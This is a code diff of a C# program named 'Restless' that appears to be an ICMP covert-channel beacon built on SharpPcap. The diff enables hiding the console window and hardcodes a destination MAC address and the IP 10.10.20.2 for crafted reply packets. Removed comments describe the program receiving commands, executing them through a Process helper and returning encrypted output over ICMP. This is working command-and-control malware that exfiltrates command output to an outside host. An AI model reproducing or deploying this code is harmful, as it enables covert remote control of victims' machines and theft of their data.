@@ -15,6 +15,7 @@ namespace Restless
         public static string IDentifier = "xXQ";
         public static int SHIFT = -1;
 
+
         [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
 
@@ -28,7 +29,7 @@ namespace Restless
         {
             var handle = GetConsoleWindow();
             // Hide
-            //ShowWindow(handle, SW_HIDE);
+            ShowWindow(handle, SW_HIDE);
 
             // Print SharpPcap version
             string ver = SharpPcap.Version.VersionString;
@@ -150,10 +151,7 @@ namespace Restless
             }
         }
 
-        /// <summary>
-        /// Echos "ip" with output as the payload.
-        /// IT GOTTA BE CHANGED
-        /// </summary>
+
         private static void classicalReply(string ip, string output)
         {
             Ping icmpClient = new Ping();
@@ -163,20 +161,12 @@ namespace Restless
 
             while (true)
             {
-                PingReply reply = icmpClient.Send(ip, 60 * 1000, msg5, options);
+                icmpClient.Send(ip, 100, msg5, options);
                 Thread.Sleep(500);
                 break;
             }
         }
 
-        /// <summary>
-        /// This function replies to the "ip.SourceAddress" via a normal ICMP echo with
-        /// the encrypted outputs. My plan is to craft an ICMP packet to reply using SharpPcap but
-        /// for now,  I am just using Ping. FYI Ping follows Windows Firewall rules, thus
-        /// If you don't get outputs back that doesn't mean the beacon is dead. Crafting an ICMP packet
-        /// will solve this problem. But I don't have time for it now. The important part is it can
-        /// receive commands and execute them with problems.
-        /// </summary>
         private static void reply(object sender, CaptureEventArgs e, string output)
         {
             string[] lines = output.Split('\n');
@@ -187,7 +177,9 @@ namespace Restless
                 //Console.WriteLine("Original Eth packet: " + eth.ToString());
                 //Console.WriteLine(Encoding.Default.GetString(eth.Bytes));
                 //Console.WriteLine("-------------");
-
+                //Console.WriteLine(eth.DestinationHardwareAddress.ToString());
+                eth.SourceHardwareAddress = System.Net.NetworkInformation.PhysicalAddress.Parse(eth.DestinationHardwareAddress.ToString());
+                eth.DestinationHardwareAddress = System.Net.NetworkInformation.PhysicalAddress.Parse("005056ACCBC8");
                 var ip = packet.Extract<PacketDotNet.IPPacket>();
                 if (ip != null)
                 {
@@ -195,16 +187,14 @@ namespace Restless
 
                     // classical Reply
                     classicalReply(ip.SourceAddress.ToString(), output);
-
-                    // So far, I am using normal ICMP packets to send back the outputs.
-                    // I need to remove this return and create an ICMP reply.
-                    // Future work.
                     return;
 
 
                     //manipulate IP parameters
                     ip.SourceAddress = System.Net.IPAddress.Parse(ip.DestinationAddress.ToString());
-                    ip.DestinationAddress = System.Net.IPAddress.Parse(ip.SourceAddress.ToString());
+                    //ip.DestinationAddress = System.Net.IPAddress.Parse(ip.SourceAddress.ToString());
+                    ip.DestinationAddress = System.Net.IPAddress.Parse("10.10.20.2");
+
                     Console.WriteLine(Encoding.Default.GetString(ip.Bytes));
                     Console.WriteLine("-------------");
 
@@ -216,10 +206,15 @@ namespace Restless
                     Console.WriteLine("-------------");
 
 
+
                     //Console.WriteLine(icmp.ParentPacket.ToString());
                     Console.WriteLine(icmp.PayloadData.ToString());
                     Console.WriteLine(Encoding.Default.GetString(icmp.PayloadData));
                     Console.WriteLine("-------------");
+
+                    ip.PayloadPacket = icmp;
+                    eth.PayloadPacket = ip;
+
 
 
 
@@ -241,12 +236,10 @@ namespace Restless
 
                             try
                             {
-                                Byte[] array = new Byte[64];
-                                Array.Clear(array, 0, array.Length);
-
+                                Console.WriteLine(eth.ToString());
                                 //Send the packet out the network device
                                 //foreach (string line in lines) {
-                                dev.SendPacket(array);
+                                dev.SendPacket(eth.Bytes);
                                 //}
 
                                 Console.WriteLine("-- Packet sent successfuly.");
@@ -273,9 +266,7 @@ namespace Restless
 
         }
 
-        /// <summary>
-        /// Executes the command then returns the process object.
-        /// </summary>
+
         static Process execute(string command, string fileName)
         {
             Process process = new Process();
@@ -287,5 +278,6 @@ namespace Restless
             process.Start();
             return process;
         }
+
     }
 }
